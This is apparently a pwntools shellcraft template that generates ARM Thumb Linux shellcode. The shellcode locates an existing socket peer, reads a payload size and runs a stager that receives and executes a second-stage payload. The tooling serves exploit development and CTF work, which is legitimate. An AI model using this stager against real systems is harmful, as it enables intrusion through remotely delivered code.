<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.thumb import linux %>
<%docstring>
Findpeer recvsize stager
Args:
    port, the port given to findpeer (defaults to any)
</%docstring>
<%page args="port = None"/>

${linux.findpeer(port)}
${linux.recvsize('r6', 'r1')}
${linux.stager('r6', 'r1')}
